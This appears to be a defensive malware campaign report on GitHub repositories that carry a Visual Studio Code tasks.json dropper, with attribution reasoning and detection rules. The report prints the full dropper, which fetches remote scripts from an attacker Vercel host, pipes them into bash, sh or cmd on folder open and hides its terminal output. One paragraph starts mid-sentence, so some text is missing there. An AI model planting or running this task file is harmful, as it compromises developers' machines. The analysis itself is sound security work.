# Campaign report: folderOpen droppers on disposable Vercel hosts

Date of report: 2026-07-21
Analyst: THE_WARDEN
Tool: git_warden, static analysis only. No sample was executed and no attacker
host was contacted.

## Summary

git_warden is tracking a cluster of 71 GitHub repositories, spread across 12
account owners, that all carry the same first stage dropper. The dropper is a
Visual Studio Code task file that runs a remote shell command the moment the
folder is opened in the editor. The victim does not have to build the project,
install anything, or click a button. Opening the folder is the whole attack.

Every repository in the cluster fetches its payload from the same host,
`default-configuration.vercel.app`. A second host,
`default-configuration-sandy.vercel.app`, serves the same path to 15 of them and
is almost certainly a redeploy of the same Vercel project.

The technique matches the delivery method used by the DPRK linked "Contagious
Interview" campaign. The pattern of victims does not match that campaign well.
The report explains both points and lands on a probable rather than a confirmed
attribution. See "Attribution" below.

## The dropper

Each infected repository contains one or more copies of `.vscode/tasks.json`.
The file is short and it is always the same shape:

```json
{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "env",
            "type": "shell",
            "osx":     { "command": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash" },
            "linux":   { "command": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh" },
            "windows": { "command": "curl https://default-configuration.vercel.app/settings/win?flag=9-test | cmd" },
            "problemMatcher": [],
            "presentation": {
                "reveal": "never",
                "echo": false,
                "focus": false,
                "close": true,
                "panel": "dedicated",
                "showReuseMessage": false
            },
            "runOptions": { "runOn": "folderOpen" }
        }
    ]
}
```

Four details make this unambiguous, and any one of them on its own would be
worth a second look.

1. `runOn: folderOpen` means the command runs automatically when the folder is
   opened. There is no user action in the chain.
2. The command is a fetch piped straight into a shell. Nothing is written to
   disk first and nothing is checked before it runs.
3. There is a separate payload for macOS, Linux and Windows, so the operator
   built for all three.
4. The `presentation` block hides the work. `reveal: never` stops the terminal
   panel from appearing, `echo: false` stops the command being printed,
   `close: true` disposes of the panel afterwards. A normal task has no reason
   to suppress its own output that thoroughly. This is the part that removes
   any doubt about intent.

The label `env` is chosen so a developer skimming the file reads it as ordinary
environment setup.

unrelated personal projects, the straightforward reading is that the account was
compromised and the dropper was pushed into everything the owner had. The owners
are more likely to be victims than operators. Anyone acting on this report
should treat the account holders accordingly.

## Attribution

The assessment is probable DPRK, Contagious Interview. It rests on two
independent signals, which is the minimum this tool requires before it will
assert an origin rather than record a lead.

Signals that fired:

1. Tradecraft vector. A `folderOpen` autorun in `.vscode/tasks.json` is the
   signature delivery method of the Contagious Interview campaign.
2. Infrastructure overlap. `default-configuration.vercel.app` also appears in
   other repositories in this data set that were confirmed earlier.

Supporting but not separately scored: payload selection per operating system,
and throwaway free hosting for the first stage. Both are consistent with the
campaign.

Signals that did not fire, and they matter:

1. No corroboration from OpenSourceMalware. OSM has not labelled this cluster
   as DPRK. The origin call here is ours alone.
2. No malware family fingerprint. There is no BeaverTail or InvisibleFerret
   evidence, because the second stage lives on the attacker host and never in
   the repository. A static tool has nothing local to fingerprint.
3. No named group intelligence tag, and no threat actor key on any record.

Argument against the attribution, stated plainly because it is a real one. The
Contagious Interview campaign works by planting a small number of purpose built
"coding assignment" repositories that a fake recruiter sends to a chosen target.
What is in front of us is the opposite: mass injection into many ordinary
repositories belonging to a handful of real developers. That is the shape of
credential theft followed by a scripted push, not the shape of targeted social
engineering. The folderOpen technique has also been publicly documented for some
time now, so ordinary criminal operators copy it freely.

Shared technique plus shared disposable infrastructure is strong evidence that
these 71 repositories belong to one campaign. It is weaker evidence about which
campaign. Probable is the correct tier and this report does not go higher.

### What would settle it

Retrieving the second stage from `default-configuration.vercel.app` and
fingerprinting it for the known DPRK families would raise this to confirmed or
knock it down. That means sending a request to live attacker infrastructure,
which the operator can log, so it has not been done. If it is done later it
should be from an isolated virtual machine on a connection that does not
identify the researcher, and the result should be appended to this report.

## Novel capture from the 2026-07-21 run

`umrasghar/webflow-automator`, commit `61c022b4535449e913795dd5683c791fd70654cc`.

The repository presents itself as a desktop application for recording and
replaying browser automation, described as a no code tool. It has no stars and
no forks. It was created on 2025-05-18 and last pushed on 2026-04-11.

It carries six copies of the dropper, one in each of these directories:

```
workflow/.vscode/tasks.json
ui/.vscode/tasks.json
docs/.vscode/tasks.json
data/.vscode/tasks.json
core/.vscode/tasks.json
automation/.vscode/tasks.json
```

Six copies means whichever subdirectory the victim opens in the editor, the
payload still runs. Every other repository in this cluster carries one copy at
the root, so this is the only one seen so far that covers its subdirectories as
well.

Every other repository in the cluster is already in OpenSourceMalware. This one
was checked against the recent feed and against OSM's full history under all
four identifier spellings, and it is not present. It is the only genuinely new
report available from this cluster.

## Detection guidance

The reliable signal is not the host name. Hosts are disposable and this operator
has already replaced one. The reliable signal is the file shape. Search a
repository, or an entire estate, for a task file that combines an automatic
trigger with a remote fetch:

1. Any `.vscode/tasks.json` containing `"runOn": "folderOpen"`.
2. Of those, any whose command contains `curl` or `wget` piped into `sh`,
   `bash`, `cmd` or `powershell`.
3. Treat a `presentation` block with `"reveal": "never"` as aggravating. It has
   almost no legitimate use next to a fetch and pipe.

Rules 1 and 2 together are high precision. In this data set that combination has
not produced a single false positive.

For defenders running Visual Studio Code in an organisation, the setting
`task.allowAutomaticTasks` controls whether `folderOpen` tasks run at all.
Setting it to `off` removes this entire attack class regardless of which host is
serving the payload.

## Method note

The cluster was not found by scanning for one host. It was found by code
searching for the task file shape, confirming the first repository by static
analysis, and then pivoting on the owner. One confirmation maps a whole network,
because an operator who injects into one repository of a compromised account
almost always injects into the rest. Owner pivot produced 40 of these 71
records under the `malicious_owner` detection method.

The practical lesson is to pivot on the owner as soon as one repository is
confirmed, rather than continuing to search for more indicators.
